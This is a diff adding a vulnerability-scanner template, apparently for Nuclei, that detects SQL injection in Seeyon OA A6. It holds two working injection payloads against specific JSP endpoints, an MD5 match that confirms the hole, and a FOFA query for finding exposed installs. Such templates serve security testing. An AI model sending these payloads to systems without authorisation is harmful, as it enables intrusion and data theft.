@@ -1,0 +1,26 @@
+id: seeyon-oa-a6-sqli
+
+info:
+  name: Seeyon OA A6 Sqli
+  author: zp857
+  severity: medium
+  reference: https://moresec.yuque.com/iixlqz/wnv3e6/hx1eyd
+  tags: seeyon-oa,sqli
+  metadata:
+    fofa-query: 'body="致远协创A6"'
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=%2899999%29%20union%20all%20select%201,2,%28md5%281%29%29,4"
+      - "{{BaseURL}}/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - c4ca4238a0b923820dcc509a6f75849b
